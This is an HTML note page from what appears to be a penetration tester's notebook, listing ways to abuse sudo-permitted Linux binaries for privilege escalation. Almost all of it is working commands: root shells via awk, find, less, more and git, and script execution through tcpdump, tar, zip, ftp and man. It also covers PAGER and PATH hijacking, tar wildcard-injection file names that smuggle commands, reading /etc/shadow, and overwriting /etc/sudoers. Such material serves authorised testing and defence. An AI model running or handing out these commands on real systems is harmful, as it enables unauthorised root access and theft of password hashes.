<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Excessive / Dangerous Binaries Allowed</title>
</head><body>If you have sudo access to certain commands, it can allow you to fully escalate privs. Also check out the binaries in <a href="nbk:///0dc4f20c-b131-407b-b6d1-e6e19c6587c2">rbash / restricted shell</a>&nbsp;<br/>
<br/>
See <a href="https://gtfobins.github.io">GTFO Bins</a>&nbsp;github<br/>
<br/>
cp<br/>
&nbsp;&#09;Overwrite /etc/shadow or /etc/sudoers &#09;#please make a backup first<br/>
awk<br/>
&nbsp;&#09;awk 'BEGIN {system("/bin/bash")}'<br/>
bash<br/>
&nbsp;&#09;bash -i<br/>
find #make sure the file can be found!<br/>
&nbsp;&#09;find / -name /etc/passwd -exec bash -i \; <br/>
&nbsp;&#09;find / -name /etc/passwd -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;<br/>
less<br/>
&nbsp;&#09;From less, you can go into vi and then into shell<br/>
&nbsp;&#09;less /etc/shadow<br/>
&nbsp;&#09;v<br/>
&nbsp;&#09;:shell<br/>
less<br/>
&nbsp;&#09;If less can 'sudo /file/log/*', you can either use file/log/../../etc/shadow or the :n switch, etc<br/>
more<br/>
&nbsp;&#09;run more on a file larger than your screen<br/>
&nbsp;&#09;!/bin/bash<br/>
mv<br/>
&nbsp;&#09;Overwrite /etc/shadow or /etc/sudoers &#09;#please make a backup first<br/>
Many more binaries you can exec in (see <a href="nbk:///0dc4f20c-b131-407b-b6d1-e6e19c6587c2">rbash</a>&nbsp;page)<br/>
Programming language? See reverse shells section<br/>
sh<br/>
<br/>
tcpdump<ul><li style="list-style-type: none">echo $'id\ncat /etc/shadow' &gt; /tmp/.test</li>
<li style="list-style-type: none">chmod +x /tmp/.test</li>
<li style="list-style-type: none">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">or another</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh</li>
<li style="list-style-type: none"></li>
</ul>
tar<br/>
&nbsp;&#09;tar c a.tar -I ./runme.sh a<br/>
<br/>
&nbsp;&#09;or <br/>
<ul><li style="list-style-type: none">&nbsp;--checkpoint=&lt;number&gt; and --checkpoint-action=&lt;command&gt; where checkpoint corresponds to a specific number of files that should be handled by tar before performing the action</li>
<li style="list-style-type: none">if you cannot edit the tar command, you can create files on the system for wildcard injection</li>
<li style="list-style-type: none">touch "-checkpoint-action=exec=sh rshell.sh"</li>
<li style="list-style-type: none">touch "-checkpoint=1"</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash</li>
</ul>
<br/>
<br/>
zip<br/>
&nbsp;&#09;zip z.zip a -T -TT ./runme.sh<br/>
ftp<br/>
&nbsp;&#09;ftp&gt; ! ./runme.sh<br/>
man<br/>
&nbsp;&#09;man -P /tmp/runme.sh man<br/>
<br/>
environment variables!<ul><li style="list-style-type: none">export PAGER=./runme.sh</li>
<li style="list-style-type: none">git -p help</li>
<li style="list-style-type: none">git, man, etc programs. Anything that can use the PAGER env variable</li>
<li style="list-style-type: none"></li>
</ul>
git<br/>
&nbsp;&#09;export PATH=/tmp:$PATH<ul><li style="list-style-type: none">ln -sf /tmp/runme.sh /tmp/git-help</li>
<li style="list-style-type: none">git --exec-path=/tmp help</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">&nbsp;--exec-path must be in $PATH in order to be executed</li>
<li style="list-style-type: none"></li>
</ul>
<br/>
<br/>
Apache (-f uses directives in the file config on startup)<br/>
&nbsp;&#09;sudo apache2 -f /etc/shadow<br/>
&nbsp;&#09;to host a protected file that you can then view</body></html>